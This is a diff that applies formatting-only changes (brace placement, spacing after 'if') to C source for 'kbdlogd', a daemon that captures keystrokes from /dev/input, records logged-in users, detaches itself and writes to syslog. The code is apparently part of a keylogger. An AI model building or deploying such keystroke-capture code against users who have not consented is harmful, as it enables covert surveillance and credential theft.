@@ -40,8 +40,7 @@ int debug_flag = 1;
 int update_flag = 1;
 int update_time;
 
-void main (int argc, char **argv)
-{
+void main (int argc, char **argv) {
     int c, fd;
     int option_index = 0;
 
@@ -164,11 +163,11 @@ void main (int argc, char **argv)
             }
 
             fd = open(KBDL_NULL, O_RDWR, 0);
-            if(fd != -1) {
+            if (fd != -1) {
                 dup2(fd, STDIN_FILENO);
                 dup2(fd, STDOUT_FILENO);
                 dup2(fd, STDERR_FILENO);
-                if(fd > 2) close(fd);
+                if (fd > 2) close(fd);
             }
     }
 
@@ -187,8 +186,7 @@ void main (int argc, char **argv)
     kbdlogd_s();
 }
 
-void end_sig(int signum)
-{
+void end_sig(int signum) {
     fclose(lfd);
     puts_syslog(KBDL_SYSL_E);
     
@@ -198,8 +196,7 @@ void end_sig(int signum)
     exit(EXIT_SUCCESS);
 }
 
-void kbdlogd_s()
-{
+void kbdlogd_s() {
     int fd, size, keyid, x = -1, c = 0;
     char timebuf[100];
     char *keybuf[255];
@@ -271,8 +268,7 @@ void kbdlogd_s()
     }
 }
 
-void *update()
-{
+void *update() {
     while (true) {
         users();
         if (!update_flag) sleep(update_time);
@@ -282,8 +278,7 @@ void *update()
     pthread_exit(NULL);
 }
 
-void users(void)
-{
+void users(void) {
     int fd, rd;
     struct utmp ut;
     pid_t pid;
@@ -312,7 +307,7 @@ void users(void)
             exit(EXIT_FAILURE);
         }
 
-        if(rd == 0) break;
+        if (rd == 0) break;
 
         if (ut.ut_type == USER_PROCESS) {
             if (debug_flag == 0) printf("'%s' at '%s'\n", ut.ut_name, ut.ut_id);
@@ -329,23 +324,20 @@ void users(void)
     fflush(lfd);
 }
 
-void puts_debug(char *str, int type)
-{
+void puts_debug(char *str, int type) {
     if (debug_flag == 0) {
         if (type == 0) puts(str);
         else printf("%s", str);
     }
 }
 
-void puts_syslog(char *str)
-{
+void puts_syslog(char *str) {
     openlog(KBDL_NAME, LOG_PID, LOG_DAEMON);
     syslog(LOG_NOTICE, "%s", str);
     closelog();
 }
 
-void usage(void)
-{
+void usage(void) {
     puts("usage: kbdlogd [OPTIONS]...\n"
         "Capure keyboard stream data from /dev/input/*\n\n"
         "Avaiable options.\n"
